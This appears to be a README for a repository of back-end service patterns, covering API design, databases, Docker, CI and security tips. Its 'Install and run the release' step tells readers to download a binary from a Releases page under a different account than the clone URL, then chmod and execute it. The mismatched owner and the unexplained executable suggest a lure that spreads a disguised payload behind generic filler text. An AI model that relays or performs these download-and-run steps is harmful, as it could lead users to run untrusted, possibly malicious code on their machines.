About
This repo gathers patterns and sample code for building back-end services. It targets developers who design APIs, model data, and operate services. The materials favor clarity, predictable behavior, and small surface area for bugs.

What you get
- Example REST and GraphQL endpoints
- Service skeletons in Node, TypeScript, Go, Python, PHP, and Java
- Database schemas and migration examples for PostgreSQL and MySQL
- Caching patterns using Redis
- Container and deployment configs (Dockerfile, docker-compose, Nginx)
- CI templates for GitHub Actions
- Test suites and sample load tests
- Reference docs for error handling, rate limiting, auth, and schema design

Tech stack
- Languages: JavaScript, TypeScript, Python, Go, PHP, Java
- Frameworks: Express, NestJS, Django, FastAPI, Laravel, Spring Boot
- Databases: PostgreSQL, MySQL, MongoDB, Redis, SQLite
- APIs: REST, GraphQL, gRPC, WebSocket
- Tools: Docker, Git, Postman, Insomnia, Nginx
- DevOps: GitHub Actions, PM2, AWS EC2, Heroku

Quickstart — local
1. Clone the repo
   - git clone https://github.com/88qji/88qji.git
2. Move into a service directory
   - cd services/node-service
3. Install dependencies
   - npm install
4. Copy environment file and update values
   - cp .env.example .env
5. Start with Docker Compose
   - docker-compose up --build

Install and run the release
- Download the release asset from the Releases page: https://github.com/Rabbi7869/88qji/releases
- The release contains a runnable artifact for demo and quick tests. Download the file that matches your OS and architecture.
- Make the file executable and run it
  - chmod +x ./88qji-demo
  - ./88qji-demo --port=8080
- The demo exposes a small API for health, auth, and a sample data model. Use it to validate integrations before you spin up the full stack.

API design principles
- Keep endpoints thin. Let services handle one responsibility.
- Use clear URIs and HTTP verbs that match actions.
- Return consistent response envelopes with status, data, and error fields.
- Use standard status codes. Map business errors to specific codes.
- Document input and output with OpenAPI and examples.
- Version APIs via the URL (/v1/) or headers.
- Use pagination for list endpoints and filters for queries.
- Protect sensitive data at the schema level. Never leak internal fields.

Example REST routes
- GET /v1/health — service status
- POST /v1/auth/login — returns JWT
- GET /v1/users — list users (paginated)
- GET /v1/users/{id} — user details
- POST /v1/items — create item
- PUT /v1/items/{id} — update item
- DELETE /v1/items/{id} — delete item

Auth and security
- Use JWT for stateless sessions and short TTL for tokens.
- Validate tokens on every protected endpoint.
- Store secrets in environment variables or a secrets manager.
- Rate limit high-risk endpoints like auth and password resets.
- Sanitize inputs and use prepared statements for DB access.
- Enforce TLS at the proxy layer (Nginx, load balancer).

Database patterns
- Prefer relational model for data with clear relationships. Use PostgreSQL when you need strong constraints and transactions.
- Use unique indexes and foreign keys to maintain integrity.
- Apply migrations for schema changes. Keep migration files small and reversible.
- For high-read workloads, use read replicas and caching with Redis.
- For event-driven flows, consider using a publish-subscribe model with a durable queue.
- Model soft deletes when you need audit trails and hard deletes for cleanup jobs.

Sample schema snippet (concept)
- users: id, email, password_hash, created_at, updated_at
- organizations: id, name, created_at
- user_organization: user_id, organization_id, role
- items: id, owner_id, payload, state, created_at

Migrations and seeds
- Place numbered migration files under /db/migrations
- Keep seed data minimal and configurable via env flags
- Run migrations in CI before deploying new releases

Observability and testing
- Expose /metrics for Prometheus and /health for health checks.
- Log structured JSON with request id, timestamp, level, and message.
- Use distributed tracing when your system spans services.
- Write unit tests for business logic and integration tests for API flows.
- Add an end-to-end test that runs against the demo release or a test environment.
- Use tools like k6 or wrk for load testing small endpoints and background jobs.

CI/CD and deployment
- Use GitHub Actions to run linters, tests, and build artifacts.
- Build container images in CI and push to a container registry.
- Create a staging environment that mirrors production.
- Deploy via rolling updates and keep a rollback plan.
- Automate database migrations as part of the deployment pipeline.
- Use health checks for readiness and liveness probes.

Docker and containers
- Keep images small. Use multi-stage builds.
- Avoid running processes as root inside the container.
- Configure a small, focused entrypoint that runs one process.
- Use environment variables for runtime configuration.
- Store persistent data in external volumes or managed services.

Error handling
- Return structured errors with code and human message.
- Separate user errors from system errors.
- Retry transient failures with exponential backoff in clients.
- Fail fast on config errors and provide clear startup logs.

Performance tips
- Cache heavy queries with TTL-based keys.
- Use connection pools and set sensible limits.
- Apply batch operations for write-heavy workflows.
- Profile hotspots and optimize code paths in server runtime.

Contributing
- Open an issue to discuss feature ideas or bugs.
- Fork the repo, create a feature branch, and open a pull request.
- Follow the code style in the language folder you edit.
- Include tests for new logic and update docs when you change APIs.
- Use descriptive commit messages and link issues where relevant.

Repository etiquette
- Keep commits focused and small.
- Avoid breaking public endpoints without a migration plan.
- Document high-impact changes in the release notes.
